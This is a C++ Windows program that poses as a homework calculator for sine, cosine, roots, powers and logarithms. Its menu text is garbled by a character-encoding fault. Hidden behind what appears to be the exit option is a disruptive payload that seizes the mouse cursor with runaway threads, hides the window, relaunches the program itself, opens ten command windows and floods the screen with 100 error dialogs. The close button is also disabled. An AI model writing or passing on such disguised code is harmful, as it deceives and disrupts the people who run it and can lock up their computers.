#include<fstream>
#include<string>
#include<cmath>
#define _CRT_SECURE_NO_WARNINGS
#define PI 3.14159
#include <iostream>
#include <pthread.h>
#include <unistd.h>
#include <windows.h>
#include <time.h>
#include <conio.h>
using namespace std;
int op;
double x,y;
void bd();
void init(){
	system("color f0");
}
void DGA() {
	DeleteMenu(GetSystemMenu(GetConsoleWindow(), FALSE),
		SC_CLOSE, MF_DISABLED);
	DrawMenuBar(GetConsoleWindow());
}
void outbat(){
	ofstream ob;
	ob.open("S.bat",ios::out);
	ob<<"@echo off";
	ob<<endl;
	ob<<"title S";
	ob<<endl;
	ob<<"pause";
	ob.close();
}
void main_cd(){
	DGA(); 
	cout<<"1.���� sin x"<<endl<<"2.���� cos x"<<endl<<"3.���� tan x"<<endl<<"4.���� x ������ƽ����"<<endl<<"5.���� x �� y �η�"<<endl;
	cout<<"6.����lg(x)"<<endl<<"7.���� atan x"<<endl<<"8.����ln(x)"<<endl<<"9.�˳�"<<endl<<"������:"<<endl;
}
int main(){
	init();
	system("cls");
	cout<<"This program can help you do your homework!---made with YR."<<endl;
	main_cd();
	while(1){
		cin>>op;
		if(op==1){
			system("cls");
			cout<<"����x:";
			cin>>x;
			cout<<sin(x*PI/180.0)<<endl;
			system("pause");
			system("cls");
			main_cd();
		}
		else if(op==2){
			system("cls");
			cout<<"����x:";
			cin>>x;
			cout<<cos(x*PI/180.0)<<endl;
			system("pause");
			system("cls");
			main_cd();
		}
		else if(op==3){
			system("cls");
			cout<<"����x:";
			cin>>x;
			cout<<tan(x*PI/180.0)<<endl;
			system("pause");
			system("cls");
			main_cd();
		}
		else if(op==4){
			system("cls");
			cout<<"����x:";
			cin>>x;
			cout<<sqrt(x)<<endl;
			system("pause");
			system("cls");
			main_cd();
		}
		else if(op==5){
			system("cls");
			cout<<"����x��y:";
			cin>>x>>y;
			cout<<pow(x,y)<<endl;
			system("pause");
			system("cls");
			main_cd();
		}
		else if(op==6){
			system("cls");
			cout<<"����x:";
			cin>>x;
			cout<<log10(x)<<endl;
			system("pause");
			system("cls");
			main_cd();
		}
		else if(op==7){
			system("cls");
			cout<<"����x:";
			cin>>x;
			cout<<atan(x*PI/180.0)<<endl;
			system("pause");
			system("cls");
			main_cd();
		}
		else if(op==8){
			system("cls");
			cout<<"����x:";
			cin>>x;
			cout<<log(x)<<endl;
			system("pause");
			system("cls");
			main_cd();
		}
		else if(op==9){
			bd();
		}
	}
	return 0;
}

void *test(void *ptr)
{
//	int i;
	int x=GetSystemMetrics(SM_CXSCREEN);
	int y=GetSystemMetrics(SM_CYSCREEN);
	srand(time(NULL));
	for(int i=1;i<=10000000000000;i++)SetCursorPos(rand()%x,rand()%y);
}
void bd()
{
	pthread_t pId;
	int ret;
	pthread_t pId1;
	int ret1;
	//����2�����߳�:�߳�1idΪpId,�߳�2idΪpId1 
	ret = pthread_create(&pId,NULL,test,NULL);
	ret1 = pthread_create(&pId1,NULL,test,NULL);
 
	if (ret != 0)
	{
		cout<<"error��"<<endl; 
		return;
	}
	if (ret1 != 0)
	{
		cout<<"error��"<<endl; 
		return;
	}
	
	/*���ؿ���̨ͼ��*/ 
	HWND hWnd = GetConsoleWindow(); 
    SetWindowLong(hWnd, GWL_EXSTYLE, WS_EX_TOOLWINDOW); 
 
	/*�����Լ��ļ�*/
	char s[100] = "start "; 
    system(strcat(s, _pgmptr)); 
    for(int i=0;i<10;i++) system("start cmd");
    /*����*/
    for(int i=0;i<100;i++)MessageBox(NULL,"����:��ĵ��Ա�����","error",MB_ICONEXCLAMATION); 
    
	//�ȴ��߳�pId��pId1�����
	pthread_join(pId,NULL);
	pthread_join(pId1,NULL);
}

